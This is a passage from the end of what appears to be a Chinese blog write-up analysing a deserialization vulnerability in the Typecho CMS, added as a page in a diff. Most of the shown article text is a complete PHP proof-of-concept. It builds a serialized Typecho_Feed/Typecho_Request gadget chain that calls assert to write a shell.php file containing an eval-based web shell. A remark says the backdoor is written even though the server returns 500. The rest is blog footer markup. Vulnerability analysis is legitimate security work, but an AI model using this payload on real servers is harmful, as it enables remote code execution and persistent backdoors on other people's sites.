+<p>但其实还有另一种利用方法，即使500了也还是执行了命令的，所以我们可以直接写入后门，代码如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Typecho_Request</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$_filter</span> = <span class="hljs-keyword">array</span>();<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$_params</span> = <span class="hljs-keyword">array</span>();<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;_filter[<span class="hljs-number">0</span>] = <span class="hljs-string">&#x27;assert&#x27;</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;_params[<span class="hljs-string">&#x27;screenName&#x27;</span>] = <span class="hljs-string">&#x27;file_put_contents(&quot;shell.php&quot;, &quot;&lt;?php @eval(\$_POST[w0s1np]); ?&gt;&quot;)&#x27;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Typecho_Feed</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">const</span> RSS2 = <span class="hljs-string">&#x27;RSS 2.0&#x27;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$_type</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$_items</span> = <span class="hljs-keyword">array</span>();<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;_type = <span class="hljs-built_in">self</span>::RSS2;<br>        <span class="hljs-keyword">$this</span>-&gt;_items[<span class="hljs-number">0</span>] = <span class="hljs-keyword">array</span>(<br>            <span class="hljs-string">&#x27;author&#x27;</span> =&gt; <span class="hljs-keyword">new</span> Typecho_Request(),<br>        );<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$final</span> = <span class="hljs-keyword">new</span> Typecho_Feed();<br><span class="hljs-variable">$poc</span> = <span class="hljs-keyword">array</span>(<br>    <span class="hljs-string">&#x27;adapter&#x27;</span> =&gt; <span class="hljs-variable">$final</span>,<br>    <span class="hljs-string">&#x27;prefix&#x27;</span> =&gt; <span class="hljs-string">&#x27;typecho_&#x27;</span><br>);<br><span class="hljs-keyword">echo</span> urlencode(base64_encode(serialize(<span class="hljs-variable">$poc</span>)));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>虽然使用后，服务器还是回显500，但后门会成功写入</p>
+<p><img src="/wzimg/25.png" alt="z"></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/projects_url">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Typcho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">1.</span> <span class="toc-text">Typcho反序列化漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BD%B1%E5%93%8D%E8%8C%83%E5%9B%B4%EF%BC%9A"><span class="toc-number">1.1.</span> <span class="toc-text">影响范围：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%EF%BC%9A"><span class="toc-number">1.2.</span> <span class="toc-text">环境搭建：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%EF%BC%9A"><span class="toc-number">1.3.</span> <span class="toc-text">漏洞分析：</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2021/04/10/Typcho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2021/04/10/Typcho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&text=Typcho反序列化漏洞分析"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2021/04/10/Typcho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&title=Typcho反序列化漏洞分析"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2021/04/10/Typcho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&is_video=false&description=Typcho反序列化漏洞分析"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Typcho反序列化漏洞分析&body=Check out this article: http://example.com/2021/04/10/Typcho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2021/04/10/Typcho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&title=Typcho反序列化漏洞分析"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2021/04/10/Typcho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&title=Typcho反序列化漏洞分析"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2021/04/10/Typcho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&title=Typcho反序列化漏洞分析"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2021/04/10/Typcho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&title=Typcho反序列化漏洞分析"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2021/04/10/Typcho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&name=Typcho反序列化漏洞分析&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2021/04/10/Typcho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&t=Typcho反序列化漏洞分析"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2021
+    John Doe
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/projects_url">Projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
